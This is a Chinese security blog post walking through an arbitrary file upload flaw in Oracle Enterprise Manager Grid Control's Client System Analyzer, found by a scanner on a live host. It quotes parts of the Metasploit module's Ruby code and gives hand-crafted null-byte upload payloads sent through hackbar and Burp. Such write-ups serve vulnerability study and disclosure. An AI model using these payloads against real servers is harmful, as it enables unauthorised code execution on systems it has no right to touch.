***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 ***本文原创作者：一只胖麻瓜biu，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

## 0x1

 **Oracle Enterprise Manager Grid Control是可以监控和管理网格中的Oracle数据库软件的工具。**

Oracle Enterprise Manager Grid Control在实现上存在安全漏洞，远程攻击者可利用此漏洞执行任意JSP代码。

在上传XML文件时，通过未指定的POST参数发送到"Client System
Analyzer"组件某些JSP脚本的输入在用于创建XML文件之前未正确过滤，通过在请求中提供空字节造成任意JSP代码执行。

应用程序通过OCI的方式，访问数据库服务器，而OCI的访问模式，必须要安装Oracle Client。

> 参考链接：<http://blog.csdn.net/hpuedu1909/article/details/14454241>

## 0x2

最近用绿盟扫描器扫到一个：![](https://image.3001.net/images/20180731/1533020945_5b600b11d696d.png!small)

> host：[https://x.x.x.x:1158](https://x.x.x.x:1158/)

访问存在漏洞的服务器：

![](https://image.3001.net/images/20180731/1533019363_5b6004e3dbe35.png!small)

msf中search此exp：![](https://image.3001.net/images/20180731/1533020957_5b600b1ddccdf.png!small)

使用此exp：

![](https://image.3001.net/images/20180731/1533020969_5b600b2960240.png!small)

发现失败了

show options查看一下payload：

此处为payload为reverse_tcp反向连接。

> reverse_tcp反向连接（本机监听）//是服务器来连接攻击者，返回一个SHELL。
>
> bind_tcp 正向连接 (目标监听) // 是攻击者主动连接服务器得到一个SHELL。
>
> reverse_tcp 就是攻击者开启端口等待远程目标连接，bind_tcp 就是远程目标开启一个端口，等待攻击者连接，不用做端口映射。

考虑此处是否由于正反向连接问题，所以换成bind_tcp正向连接：

exp：

![](https://image.3001.net/images/20180731/1533020868_5b600ac4b6e99.png!small)发现仍然失败

查找此漏洞披露平台(此为SCAP中文社区)，查看此exp代码：

![](https://image.3001.net/images/20180731/1533021041_5b600b712e95e.png!small)\--ruby代码

代码主体为：

    
    
    equire 'msf/core'
    
    class Metasploit3 < Msf::Exploit::Remote
    
    HttpFingerprint = { :pattern => [ /Oracle Containers for J2EE/ ] }
    
    include Msf::Exploit::Remote::HttpClient
    
    include Msf::Exploit::EXE
    
    include Msf::Exploit::WbemExec
    
     **def initialize(info={})** //对漏洞利用的说明
    
    ……
    
    def on_new_session(client)
    
    ……
    
    def upload_file(data)
    
    ……
    
    def check
    
    ……
    
     **def exploit** //进行远程代码执行
    
    ……
    
    end

其中核心函数为exploit函数

发现其中关键函数upload_file：

 ****

    
    
     **def upload_file(data)**
    
     **res = send_request_cgi(**
    
     **{**
    
     **'uri'     = > 'd/em/ecm/csa/v10103/CSAr.jsp',**
    
     **'method'  = > 'POST',**
    
     **'data'    = > data**
    
     **})**
    
     **return res**
    
     **end**

 ****

最后返回的是res，推测res为上传的文件，其中uri是上传的页面，方法为POST，数据为data

先访问一下地址，查看是否存在该页面：

![](https://image.3001.net/images/20180731/1533020924_5b600afcecc68.png!small)

此处已判断该页面是一个可访问的空白页面

继续查看代码，def check函数：

    
    
    data = "sessionID=#{file_name}.txt\x00.xml"
    
    data << "\x0d\x0a"
    
    data << Rex::Text.uri_encode(file_contents)
    
    print_status("Uploading the CSA#{file_name}.txt file")
    
    res = upload_file(data)
    
     **if not res or res.code != 200 or (res.body !~ /posted data was written to placeholder file/ and res.body !~ /csaPostStatus=0/)**
    
     print_error("The test file could not be uploaded")
    
    print_status("Checking uploaded contents...")
    
    res = send_request_raw({'uri' => "/em/CSA#{file_name}.txt"})

 **若上传成功，上传后的地址为x.x.x.x:1158/em/CSAhack.txt**

此处说明只有csaPostStatus=0的时候才上传成功。

借助一下hackbar，此处构造的data数据：sessionID=hack.txt\x00.xml\x0d\x0ahack

![](https://image.3001.net/images/20180731/1533021611_5b600dabefced.png!small)发现页面返回csaPostStatus=5信息，根据代码说明只有csaPostStatus=0的时候才表示上传成功，

尝试一下转义：  
![](https://image.3001.net/images/20180731/1533021623_5b600db7e90dd.png!small)页面返回csaPostStatus=0，访问一下上传页面：

![](https://image.3001.net/images/20180731/1533021632_5b600dc023589.png!small)空白页面，未成功

把/x换成%，再试一下：

> \xhh表示两位的十六进制
>
> \x00======NULL
>
> \x0d======回车
>
> \x0a======\r

![](https://image.3001.net/images/20180731/1533021644_5b600dcc54825.png!small)重名报错了，说明上个步骤的hack.txt已经是上传成功了，换个名字试试：

![](https://image.3001.net/images/20180731/1533021652_5b600dd4a6262.png!small)

然而页面还是访问不了-_-
![](https://image.3001.net/images/20180731/1533021665_5b600de11fa75.png!small)

到这才发现，忽略了很重要的东西，传输的方法必须是post

所以在bp中试一下，仍然需要将/x换成%：

![](https://image.3001.net/images/20180731/1533021674_5b600dea7b5e7.png!small)

再进行url的decode：

![](https://image.3001.net/images/20180731/1533021682_5b600df23cc10.png!small)

终于出来了flag，访问页面：

![](https://image.3001.net/images/20180731/1533021696_5b600e008ba37.png!small)到这可以发现是已经上传成功了。

## 0x3

Oracle Database Server 11.1.0.7和11.2.0.1版本，以及Enterprise Manager Grid Control
10.2.0.5版本的Client System Analyzer组件中存在未明漏洞。

第一次投稿，请大家指正。

***本文原创作者：一只胖麻瓜biu，本文属FreeBuf原创奖励计划，未经许可禁止转载**

